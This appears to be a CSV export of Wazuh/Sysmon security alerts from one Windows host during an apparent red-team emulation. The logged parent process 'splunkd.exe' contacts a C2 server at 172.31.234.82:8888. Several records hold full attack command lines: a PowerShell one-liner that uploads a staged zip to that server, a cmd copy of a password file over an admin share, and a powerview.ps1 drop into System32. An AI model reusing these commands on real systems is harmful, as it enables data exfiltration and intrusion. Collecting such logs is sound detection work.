wazuh-alerts-4.x-2024.11.30,lPp6fJMBRlc-D5DFZCA5,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 09:50:12.934
ProcessGuid: {15959494-DFD4-674A-D607-000000000D00}
ProcessId: 1228
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: powershell.exe -ExecutionPolicy Bypass -C ""$ErrorActionPreference = 'Stop';$fieldName = \""C:\Windows\system32\staged.zip\"";$filePath = \""C:\Windows\system32\staged.zip\"";$url = \""http://172.31.234.82:8888/file/upload\"";Add-Type -AssemblyName 'System.Net.Http';$client = New-Object System.Net.Http.HttpClient;$content = New-Object System.Net.Http.MultipartFormDataContent;$fileStream = [System.IO.File]::OpenRead($filePath);$fileName = [System.IO.Path]::GetFileName($filePath);$fileContent = New-Object System.Net.Http.StreamContent($fileStream);$content.Add($fileContent, $fieldName, $fileName);$client.DefaultRequestHeaders.Add(\""X-Request-Id\"", $env:COMPUTERNAME + '-oginsn');$client.DefaultRequestHeaders.Add(\""User-Agent\"",\""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\"");$result = $client.PostAsync($url, $content).Result;$result.EnsureSuccessStatusCode();""
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=1B3B40FBC889FD4C645CC12C85D0805AC36BA254,MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F
ParentProcessGuid: {15959494-D565-6749-1C01-000000000D00}
ParentProcessId: 7968
ParentImage: C:\Users\Public\splunkd.exe
ParentCommandLine: ""C:\Users\Public\splunkd.exe"" -server http://172.31.234.82:8888 -group red 
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T09:50:12.935838100Z,57956,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,3,false,3,Powershell was used to delete files or directories,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92021, , ,windows_eventchannel,log,"Nov 30, 2024 @ 09:50:13.996",EventChannel,1732960213.3422909,"Nov 30, 2024 @ 09:50:13.996", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,1228, , , , , , , , , , ,"[""File Deletion""]","[""T1070.004""]","[""Defense Evasion""]", , , ,PowerShell.EXE,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,Microsoft® Windows® Operating System, , ,Windows PowerShell, , ,{15959494-DFD4-674A-D607-000000000D00},2024-11-30 09:50:12.934,"SHA1=1B3B40FBC889FD4C645CC12C85D0805AC36BA254,MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F","technique_id=T1059.001,technique_name=PowerShell",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-D565-6749-1C01-000000000D00},"\""C:\\Users\\Public\\splunkd.exe\"" -server http://172.31.234.82:8888 -group red",0x107a6b,7968,C:\\Windows\\system32\\,C:\\Users\\Public\\splunkd.exe,"powershell.exe -ExecutionPolicy Bypass -C \""$ErrorActionPreference = 'Stop';$fieldName = \\\""C:\\Windows\\system32\\staged.zip\\\"";$filePath = \\\""C:\\Windows\\system32\\staged.zip\\\"";$url = \\\""http://172.31.234.82:8888/file/upload\\\"";Add-Type -AssemblyName 'System.Net.Http';$client = New-Object System.Net.Http.HttpClient;$content = New-Object System.Net.Http.MultipartFormDataContent;$fileStream = [System.IO.File]::OpenRead($filePath);$fileName = [System.IO.Path]::GetFileName($filePath);$fileContent = New-Object System.Net.Http.StreamContent($fileStream);$content.Add($fileContent, $fieldName, $fileName);$client.DefaultRequestHeaders.Add(\\\""X-Request-Id\\\"", $env:COMPUTERNAME + '-oginsn');$client.DefaultRequestHeaders.Add(\\\""User-Agent\\\"",\\\""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36\\\"");$result = $client.PostAsync($url, $content).Result;$result.EnsureSuccessStatusCode();\""",High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,lfp6fJMBRlc-D5DFZCA5,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 09:50:13.011
ProcessGuid: {15959494-DFD4-674A-D607-000000000D00}
ProcessId: 1228
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_g3c3jquk.aaz.ps1
CreationUtcTime: 2024-11-30 09:50:13.011
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T09:50:13.019319200Z,57965,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,18,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 09:50:14.149",EventChannel,1732960214.3432867,"Nov 30, 2024 @ 09:50:14.149", , , , , , , , , , , , ,1228, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-DFD4-674A-D607-000000000D00},2024-11-30 09:50:13.011, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_g3c3jquk.aaz.ps1,2024-11-30 09:50:13.011, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,jvp3fJMBRlc-D5DFuCCP,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1059.003,technique_name=Windows Command Shell
UtcTime: 2024-11-30 09:47:13.939
ProcessGuid: {15959494-DF21-674A-D207-000000000D00}
ProcessId: 2908
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: cmd.exe /C copy \\127.0.0.1\C$\Windows\temp\Easter_Bunny.password %%TEMP%%\Easter_egg.password
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE
ParentProcessGuid: {15959494-D565-6749-1C01-000000000D00}
ParentProcessId: 7968
ParentImage: C:\Users\Public\splunkd.exe
ParentCommandLine: ""C:\Users\Public\splunkd.exe"" -server http://172.31.234.82:8888 -group red 
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T09:47:13.941765200Z,57917,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,6,false,4,Windows command prompt started by an abnormal process,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92052, , ,windows_eventchannel,log,"Nov 30, 2024 @ 09:47:15.020",EventChannel,1732960035.3407803,"Nov 30, 2024 @ 09:47:15.020", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,2908, , , , , , , , , , ,"[""Windows Command Shell""]","[""T1059.003""]","[""Execution""]", , , ,Cmd.Exe,C:\\Windows\\System32\\cmd.exe,Microsoft® Windows® Operating System, , ,Windows Command Processor, , ,{15959494-DF21-674A-D207-000000000D00},2024-11-30 09:47:13.939,"SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE","technique_id=T1059.003,technique_name=Windows Command Shell",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-D565-6749-1C01-000000000D00},"\""C:\\Users\\Public\\splunkd.exe\"" -server http://172.31.234.82:8888 -group red",0x107a6b,7968,C:\\Windows\\system32\\,C:\\Users\\Public\\splunkd.exe,cmd.exe /C copy \\\\127.0.0.1\\C$\\Windows\\temp\\Easter_Bunny.password %%TEMP%%\\Easter_egg.password,High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,g_p1fJMBRlc-D5DFFCDH,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 09:44:21.769
ProcessGuid: {15959494-DE75-674A-CD07-000000000D00}
ProcessId: 6428
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_2fi4tc10.5b3.ps1
CreationUtcTime: 2024-11-30 09:44:21.769
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T09:44:21.781974900Z,57861,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,12,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 09:44:22.902",EventChannel,1732959862.3386984,"Nov 30, 2024 @ 09:44:22.902", , , , , , , , , , , , ,6428, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-DE75-674A-CD07-000000000D00},2024-11-30 09:44:21.769, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_2fi4tc10.5b3.ps1,2024-11-30 09:44:21.769, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,nfp_fJMBRlc-D5DFRiA9,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 09:55:28.437
ProcessGuid: {15959494-E110-674A-DE07-000000000D00}
ProcessId: 6524
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_miu3tkpg.4cs.ps1
CreationUtcTime: 2024-11-30 09:55:28.437
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T09:55:28.451548400Z,58063,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,24,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 09:55:29.574",EventChannel,1732960529.3450933,"Nov 30, 2024 @ 09:55:29.574", , , , , , , , , , , , ,6524, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-E110-674A-DE07-000000000D00},2024-11-30 09:55:28.437, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_miu3tkpg.4cs.ps1,2024-11-30 09:55:28.437, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,n_p_fJMBRlc-D5DF6iBR,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 09:56:11.466
ProcessGuid: {15959494-E13B-674A-E007-000000000D00}
ProcessId: 5240
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_zfjczvad.r1o.ps1
CreationUtcTime: 2024-11-30 09:56:11.466
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T09:56:11.471065700Z,58078,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,25,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 09:56:12.596",EventChannel,1732960572.3455932,"Nov 30, 2024 @ 09:56:12.596", , , , , , , , , , , , ,5240, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-E13B-674A-E007-000000000D00},2024-11-30 09:56:11.466, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_zfjczvad.r1o.ps1,2024-11-30 09:56:11.466, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,oPqAfJMBRlc-D5DFmiAb,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 09:56:53.500
ProcessGuid: {15959494-E165-674A-E107-000000000D00}
ProcessId: 3476
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_13bc0xas.kzz.ps1
CreationUtcTime: 2024-11-30 09:56:53.500
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T09:56:53.511366000Z,58093,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,26,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 09:56:54.617",EventChannel,1732960614.3458943,"Nov 30, 2024 @ 09:56:54.617", , , , , , , , , , , , ,3476, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-E165-674A-E107-000000000D00},2024-11-30 09:56:53.500, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_13bc0xas.kzz.ps1,2024-11-30 09:56:53.500, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,o_qCfJMBRlc-D5DFgiBs,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 09:59:04.460
ProcessGuid: {15959494-E1E8-674A-E407-000000000D00}
ProcessId: 7368
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_ag4swyic.fwi.ps1
CreationUtcTime: 2024-11-30 09:59:04.460
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T09:59:04.471461300Z,58139,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,29,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 09:59:05.610",EventChannel,1732960745.3467976,"Nov 30, 2024 @ 09:59:05.610", , , , , , , , , , , , ,7368, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-E1E8-674A-E407-000000000D00},2024-11-30 09:59:04.460, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_ag4swyic.fwi.ps1,2024-11-30 09:59:04.460, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,qvqDfJMBRlc-D5DFuiDt,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 10:00:20.532
ProcessGuid: {15959494-E234-674A-E607-000000000D00}
ProcessId: 4864
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_5ot53b5k.avx.ps1
CreationUtcTime: 2024-11-30 10:00:20.532
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T10:00:20.533621700Z,58169,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,31,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 10:00:21.625",EventChannel,1732960821.3473998,"Nov 30, 2024 @ 10:00:21.625", , , , , , , , , , , , ,4864, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-E234-674A-E607-000000000D00},2024-11-30 10:00:20.532, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_5ot53b5k.avx.ps1,2024-11-30 10:00:20.532, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,kPp5fJMBRlc-D5DFZiBE,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 09:49:07.987
ProcessGuid: {15959494-D565-6749-1C01-000000000D00}
ProcessId: 7968
Image: C:\Users\Public\splunkd.exe
TargetFilename: C:\Windows\System32\powerview.ps1
CreationUtcTime: 2024-11-30 09:49:07.986
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T09:49:07.987835900Z,57938,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,1,false,6,Executable dropped in Windows root folder,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92217, , ,windows_eventchannel,log,"Nov 30, 2024 @ 09:49:09.058",EventChannel,1732960149.3417204,"Nov 30, 2024 @ 09:49:09.058", , , , , , , , , , , , ,7968, , , , , , , , , , ,"[""Lateral Tool Transfer""]","[""T1570""]","[""Lateral Movement""]", , , , ,C:\\Users\\Public\\splunkd.exe, , , , , , ,{15959494-D565-6749-1C01-000000000D00},2024-11-30 09:49:07.987, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Windows\\System32\\powerview.ps1,2024-11-30 09:49:07.986, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,rfqFfJMBRlc-D5DF8SBg,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 10:02:47.481
ProcessGuid: {15959494-E2C7-674A-EA07-000000000D00}
ProcessId: 7576
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: powershell.exe -ExecutionPolicy Bypass -C ""Copy-Item /12/2018` ` ` 4:04` AM` ` ` ` ` ` ` ` ` ` 61952` xwizard.exe C:\Windows\system32\staged""
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=1B3B40FBC889FD4C645CC12C85D0805AC36BA254,MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F
ParentProcessGuid: {15959494-D565-6749-1C01-000000000D00}
ParentProcessId: 7968
ParentImage: C:\Users\Public\splunkd.exe
ParentCommandLine: ""C:\Users\Public\splunkd.exe"" -server http://172.31.234.82:8888 -group red 
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T10:02:47.483599700Z,58207,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,4,false,3,Powershell was used to delete files or directories,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92021, , ,windows_eventchannel,log,"Nov 30, 2024 @ 10:02:48.561",EventChannel,1732960968.3483027,"Nov 30, 2024 @ 10:02:48.561", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,7576, , , , , , , , , , ,"[""File Deletion""]","[""T1070.004""]","[""Defense Evasion""]", , , ,PowerShell.EXE,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,Microsoft® Windows® Operating System, , ,Windows PowerShell, , ,{15959494-E2C7-674A-EA07-000000000D00},2024-11-30 10:02:47.481,"SHA1=1B3B40FBC889FD4C645CC12C85D0805AC36BA254,MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F","technique_id=T1059.001,technique_name=PowerShell",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-D565-6749-1C01-000000000D00},"\""C:\\Users\\Public\\splunkd.exe\"" -server http://172.31.234.82:8888 -group red",0x107a6b,7968,C:\\Windows\\system32\\,C:\\Users\\Public\\splunkd.exe,"powershell.exe -ExecutionPolicy Bypass -C \""Copy-Item /12/2018` ` ` 4:04` AM` ` ` ` ` ` ` ` ` ` 61952` xwizard.exe C:\\Windows\\system32\\staged\""",High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,tvqKfJMBRlc-D5DFIyCi,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 10:07:18.052
ProcessGuid: {15959494-E3D5-674A-F007-000000000D00}
ProcessId: 5612
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_52xwecxk.jm5.ps1
CreationUtcTime: 2024-11-30 10:07:18.052
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T10:07:18.054344600Z,58294,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,39,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 10:07:19.196",EventChannel,1732961239.3511388,"Nov 30, 2024 @ 10:07:19.196", , , , , , , , , , , , ,5612, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-E3D5-674A-F007-000000000D00},2024-11-30 10:07:18.052, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_52xwecxk.jm5.ps1,2024-11-30 10:07:18.052, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,wPqQfJMBRlc-D5DFsyBn,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 10:14:31.678
ProcessGuid: {15959494-E587-674A-F907-000000000D00}
ProcessId: 4168
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_0fpmjvmz.uja.ps1
CreationUtcTime: 2024-11-30 10:14:31.678
